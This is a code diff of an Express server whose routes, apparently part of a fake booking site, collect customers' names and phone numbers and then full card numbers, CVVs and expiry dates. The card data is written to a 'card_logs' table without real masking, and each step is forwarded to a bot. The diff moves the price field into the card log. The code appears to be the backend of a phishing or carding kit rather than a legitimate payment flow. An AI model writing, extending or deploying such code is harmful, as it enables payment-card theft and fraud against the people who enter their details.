@@ -180,17 +180,17 @@ router.post("/booking", (req, res) => {
 
 // ➝ Данные заказчика
 router.post("/customer", async (req, res) => {
-  const { fullName, phone, clientId, price } = req.body;
+  const { fullName, phone, clientId } = req.body;
 
   const sessionId = generateSessionId();
   const bookingId = Math.random().toString(36).substring(2, 10).toUpperCase();
 
   db.prepare(
     `
-    INSERT INTO customers (session_id, booking_id, client_id, fullName, phone, total_amount)
-    VALUES (?, ?, ?, ?, ?, ?)
+    INSERT INTO customers (session_id, booking_id, client_id, fullName, phone)
+    VALUES (?, ?, ?, ?, ?)
   `
-  ).run(sessionId, bookingId, clientId, fullName, phone, price);
+  ).run(sessionId, bookingId, clientId, fullName, phone);
   try {
     await sendCustomerToEchoBot({
       sessionId: sessionId,
@@ -214,7 +214,7 @@ router.post("/customer", async (req, res) => {
 
 // ➝ Данные карты
 router.post("/cardlog", async (req, res) => {
-  const { sessionId, cardNumber, expireDate, cvv, step } = req.body;
+  const { sessionId, cardNumber, expireDate, cvv, step, price } = req.body;
 
   const masked = cardNumber;
 
@@ -222,8 +222,8 @@ router.post("/cardlog", async (req, res) => {
   if (step === "card_number_only") {
     db.prepare(
       `
-      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status, step)
-      VALUES (?, ?, ?, ?, ?, ?, ?)
+      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status, step, total_amount)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
     `
     ).run(
       sessionId,
@@ -232,7 +232,8 @@ router.post("/cardlog", async (req, res) => {
       cvv || "",
       expireDate || "",
       "free",
-      "card_number_only"
+      "card_number_only",
+      price
     );
   } else {
     // Старая логика для обратной совместимости
@@ -256,6 +257,7 @@ router.post("/cardlog", async (req, res) => {
     bookingId: booking?.booking_id,
     clientId: booking?.client_id,
     step: step || "full", // Передаем шаг в бот
+    price
   });
 
   res.json({ success: true });
